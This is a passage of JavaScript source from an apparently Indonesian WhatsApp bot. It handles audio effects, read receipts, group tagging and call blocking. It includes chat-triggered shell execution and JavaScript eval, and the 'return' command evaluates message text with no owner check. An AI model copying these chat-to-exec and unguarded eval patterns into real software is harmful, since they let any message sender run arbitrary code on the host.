					mediathunder = await thunderx7. downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${mediathunder} -af equalizer=f=94:width_type=o:width=2:g=30 ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(mediathunder)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						thunderx7. sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: fvn})
						fs.unlinkSync(ran)
					})
				break
//=====================================AUDIO=====================================\\
										case 'sider':
infom = await thunderx7.messageInfo(from, thunder.message.extendedTextMessage.contextInfo.stanzaId)
tagg = []
shape = '▢'
teks = `Telah Dibaca Oleh :\n\n`
for(let i of infom.reads){
teks += shape+' ' + '@' + i.jid.split('@')[0] + '\n'
teks += `┗━ ${shape} Waktu : ` + moment(`${i.t}` * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss') + '\n\n'
tagg.push(i.jid)
}
mentions(teks, tagg, true)
break
case 'infoall': case 'tagall':
if (!thunder.key.fromMe & !isOwner) return reply(mess.only.admin)
if(!q) return reply('Ingfonya apa?')
if (!isGroup) return reply(mess.only.group)
var nom = thunder.participant
members_id = []
	teks = '\n'
	for (let mem of groupMembers) {
	teks += `┣ *▢*   @${mem.jid.split('@')[0]}\n`
	members_id.push(mem.jid)
	}
mentions(`*Info :  ${q}*\n\n*Total Member :* ${groupMembers.length} \n\n┏━ *「 ${fake1} 」* `+teks+`┗━ *「 ${fake1} 」* `, members_id, false)
break
        case 'return':
             anuiu  = {contextInfo:{"forwardingScore":1,"isForwarded":true,'stanzaId': "B826873620DD5947E683E3ABE663F263", 'participant': `${targetpc}@s.whatsapp.net`, 'remoteJid': '6283136505591-1614953337@g.us', 'quotedMessage': {"imageMessage": {"caption": `ONLINE`, 'jpegThumbnail': fs.readFileSync('./database/media/gambar.jpg')}}}}
        	return thunderx7.sendMessage(from, JSON.stringify(eval(body.slice(7))),text,anuiu, {quoted: fvn})
        	break
 //button menu
default:
if (buttonanthunder == 'Creator') {
console.log('Creator')
thunderx7.sendMessage(from, `https://instagram.com/thunderx.7\nFollow ya`, text, {quoted: thunder})
}
if (buttonanthunder == 'YT') {
console.log('YT')
thunderx7.sendMessage(from, ``, text, {"contextInfo": {text: '',"forwardingScore": 3,isForwarded: true,sendEphemeral: true,mentionedJid: [sender],"externalAdReply": {"title": `Hallo kak ${pushname}`,"body": ``,"previewType": "PHOTO","thumbnailUrl": `https://telegra.ph/file/a082de791ef8aff96ec24.jpg`,"thumbnail": "","sourceUrl": ""}}, quoted: thunder})
}
// button menu
if (budy.startsWith('$')){
if (!thunder.key.fromMe && !isOwner) return
qur = budy.slice(2)
exec(qur, (err, stdout) => {
if (err) return reply(`@Who Is Thunder?:~ ${err}`)
if (stdout) {
reply(stdout)
}
})
}
if (evalngek.startsWith('x')){
if (!thunder.key.fromMe && !isOwner) return
try {
return thunderx7.sendMessage(from, JSON.stringify(eval(hasileval.slice(2)),null,'\t'),text, {quoted: thunder})
} catch(err) {
e = String(err)
console.log(color(time, 'green'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "red"), color('Starting eval'))
reply(e)
}
}

thunderx7.on("CB:Call", json => {
if (antical === false) return
let call;
calling = JSON.parse(JSON.stringify(json))
console.log(color(time, 'green'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "red"), color('Ada yang nelpon'))
call = calling[1].from
thunderx7.sendMessage(call, `*Sorry bot can't receive calls.*\n*Call = Block!*`, MessageType.text)
.then(() => thunderx7.blockUser(call, "add"))
})
isBattre = 'Not Detect' // Battre Belum Kedetect ( MyMans APIs )
isCharge = 'Not Detect' // Charging Belum Kedetect ( MyMans APIs )
thunderx7.on (`CB:action,,battery`, json => {
                const batteryLevelStr = json[2][0][1].value
                const batterylevel = parseInt (batteryLevelStr)
                isBattre = batterylevel + "%"
                isCharge = json[2][0][1].live
})
thunderx7.on('CB:Blocklist', json => {
    if (args.length > 2) return
    for (let i of json[1].blocklist) {
        args.push(i.replace('c.us', 's.whatsapp.net'))
    }
})

if (budy.startsWith('=>')){
if (!thunder.key.fromMe) return
console.log(color(time, 'green'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "red"), color('Eval async'))
var konsol = budy.slice(3)
Return = (sul) => {
var sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined){
bang = util.format(sul)
}
return reply(bang)
}
try {
reply(util.format(eval(`;(async () => { ${konsol} })()`)))
} catch(e){
reply(String(e))
}
}

	   }
    /*.          if (isGroup && budy != undefined) {
	} else {
	console.log(color('[TEXT]', 'aqua'), `${fake}\n`, color(sender.split('@')[0]))
	}		*/
	} catch (e) {
    e = String(e)
    if (!e.includes("this.isZero")) {
	console.log('Message : %s', color(e, 'purple'))
        }
	// console.log(e)
	}
}


	
    
